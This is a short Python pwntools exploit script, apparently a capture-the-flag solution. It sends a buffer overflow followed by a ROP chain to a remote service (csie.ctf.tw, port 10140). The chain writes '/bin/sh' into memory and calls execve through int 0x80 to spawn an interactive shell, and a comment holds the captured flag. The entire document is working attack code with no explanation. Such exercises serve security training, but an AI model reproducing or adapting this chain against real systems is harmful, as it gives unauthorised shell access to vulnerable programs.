from pwn import *

#FLAG{It's_just_a_pi3c3_of_c4k3}

host = 'csie.ctf.tw'
port = 10140
y = remote(host,port)


p = 'a' * 32
p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea060) # @ .data + 4
p += p32(0x080bae06) # pop eax ; ret
p += '/bin'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret  
p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea064) # @ .data + 4
p += p32(0x080bae06) # pop eax ; ret
p += '/sh\x00'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret
p += p32(0x0806e850)
p += p32(0x0) # @ .data + 8
p += p32(0x0)
p += p32(0x080ea060) # padding without overwrite ebx
p += p32(0x080bae06) # pop eax ; ret
p += p32(0xb)
p += p32(0x080493e1) # int 0x80

print len(p)
y.sendline(p)
y.interactive()
